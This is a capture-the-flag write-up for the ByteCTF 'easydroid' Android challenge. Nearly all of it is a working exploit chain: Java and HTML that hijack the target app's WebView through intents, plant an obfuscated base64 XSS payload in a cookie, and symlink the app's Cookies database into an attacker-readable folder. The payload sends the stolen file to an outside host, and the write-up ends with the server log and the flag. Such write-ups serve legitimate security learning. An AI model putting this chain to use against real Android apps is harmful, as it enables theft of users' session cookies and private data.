### easydroid | SOLVED | working : andrea & wrlu
- Kanxue SDC 2020 slides: https://zhuanlan.kanxue.com/article-14155.htm
- XSS + CookieGrabbing + Symlink: https://blog.oversecured.com/Evernote-Universal-XSS-theft-of-all-cookies-from-all-sites-and-more/
- local cookie file read use `file://` protocol, avaliable by default before target API 29: https://developer.android.google.cn/reference/android/webkit/WebSettings#setAllowFileAccess(boolean)

Key working:
- Primitive of launch any url with the WebView in `TestActivity`
```java=
public Uri visit_set_cookie_intent =
            Uri.parse("http://toutiao.com.bytectf.wrlus.com/visit_set_cookie_intent.html");
//...
exploitTestActivity(visit_set_cookie_intent);
//...
private void exploitTestActivity(Uri uri) {
        Intent intent = new Intent();
        intent.setData(uri);
        intent.setClassName("com.bytectf.easydroid",
                "com.bytectf.easydroid.MainActivity");
        startActivity(intent);
    }
```
and on the server side
```htmlmixed=
Exp Easy TestActivity (Visit setcookie.html)
<script>
        location.href = 'intent:#Intent;launchFlags=0x3;package=com.bytectf.easydroid;component=com.bytectf.easydroid/.TestActivity;S.url=http://toutiao.com.bytectf.wrlus.com/setcookie.html;end'
</script>
```
- This we can launch `http://toutiao.com.bytectf.wrlus.com/setcookie.html` with the WebView `TestActivity`

Full solutions:
1. Visit `setcookie.html` in `TestActivity`, and set cookie:
```htmlmixed=
Exp Easy WebView
<script> 
document.cookie = "x = '<img src=\"x\" onerror=\"eval(atob('bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly90b3V0aWFvLmNvbS5ieXRlY3RmLndybHVzLmNvbT9mbGFnPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwp'))\">'"

</script>
```
2. Wait 40~45s for local cookie writting
3. Create a symbol link
```java=
private void createSymlink() {
        String rootCookieFile = "/data/data/com.bytectf.easydroid/app_webview/Default/Cookies";
        String symlinkFile = "/data/data/com.bytectf.pwneasydroid/symlink.html";

        try {
            Runtime.getRuntime().exec("ln -s " + rootCookieFile + " " + symlinkFile).waitFor();
//            Note: Must change permission for the whole folder !
            Runtime.getRuntime().exec("chmod -R 777 /data/data/com.bytectf.pwneasydroid/").waitFor();
            Runtime.getRuntime().exec("chmod 777 " + symlinkFile).waitFor();

            requestServer("ping=symlinkSucc&time" + new Date().toString());
        } catch (Exception e) {
            e.printStackTrace();
            requestServer("ping=createSymlinkError&time" + new Date().toString());
        }
    }
```
4. Visit the symbol link in `TestActivity` 
```htmlmixed=
Exp Easy TestActivity (Read symlink.html)
<script>
        location.href = 'intent:#Intent;launchFlags=0x3;package=com.bytectf.easydroid;component=com.bytectf.easydroid/.TestActivity;S.url=file:///data/data/com.bytectf.pwneasydroid/symlink.html;end'
</script>
```
5. The cookie file is loaded as a html file, and has a XSS:
```htmlmixed=
�Lite format 3@ .�
8�
�f%indexis_transientcookieCREATE INDEX is_transient ON cookies(persistent) where persistent != 1ACREATE INDEX domain ON cookies(host_key)�`tablecookiescookiesCREATE TABLE cookies (creation_utc INTEGER NOT NULL UNIQUE PRIMARY KEY,host_key TEXT NOT NULL,name TEXT NOT NULL,value TEXT NOT NULL,path TEXT NOT NULL,expires_utc INTEGER NOT NULL,secure INTEGER NOT NULL,httponly INTEGER NOT NULL,last_access_utc INTEGER NOT NULL, has_expires INTEGER NOT NULL DEFAULT 1, persistent INTEGER NOT NULL DEFAULT 1,priority INTEGER NOT NULL DEFAULT 1,encrypted_value BLOB DEFAULT '',firstpartyonly INTEGER NOT NULL DEFAULT 0)-Andexsqlite_autoindex_cookies_1cookiesf�/tablemetametaCREATE TABLE meta(key LONGVARCHAR NOT NULL UNIQUE PRIMARY KEY, value LONGVARCHAR)';indexsq����last_compatible_version5
ersion9#mmap_status-1
����last_compatible_version
����ˣѷ�!�E  mmap_status
toutiao.com.bytectf.wrlus.comx'<img src="x" onerror="eval(atob('bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly90b3V0aWFvLmNvbS5ieXRlY3RmLndybHVzLmNvbT9mbGFnPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoImh0bWwiKVswXS5pbm5lckhUTUwp'))">'//-��!
��/-��!/-��!
��(Gtoutiao.com.bytectf.wrlus.com/-��!
��
/-��!
```
- The base64 part is
```javascript=
new Image().src = "http://toutiao.com.bytectf.wrlus.com?flag=" + encodeURIComponent(document.getElementsByTagName("html")[0].innerHTML)
```
6. Finally the original cookie file will be sent to the `http://toutiao.com.bytectf.wrlus.com?flag=` link

- Real server response:
```
//...
toutiao.comgftokenMjQ1NzkwODA3OHwxNjM0NDUzNzc0NTB8fDAGBgYGBgY//-â¢Åï¬Ã/-4Ã&gt;ÃcÃ³ÃÂ£âÃÂ¶Ë9!Ã tiktok.comflagQnl0ZUNURns5MTFjOTVhZi02MWI4LTQ2NTUtOGE0Zi1hMjk0MzBmMDcyMGV9//-4ÃÎ9
âÃÃ¿Æâ/-577c/-577c/-4Ã?%/-4Ã?%/-4Ã&gt;Ã/-4Ã&gt;Ã/-4ÃÎ9/-4ÃÎ9
Ã¢Åâ¤ÃÃ¢(Gtoutiao.com.bytectf.wrlus.com/-577c-.app.toutiao.com/-4Ã?%-.app.toutiao.com/-4Ã&gt;Ã!tiktok.com/-4ÃÎ9
ÃÃÃ/-577c/-4ÃÎ9</body> HTTP/1.1" 200 6 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Android SDK built for x86_64 Build/OSM1.180201.023; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36"
```
- ByteCTF{911c95af-61b8-4655-8a4f-a29430f0720e}
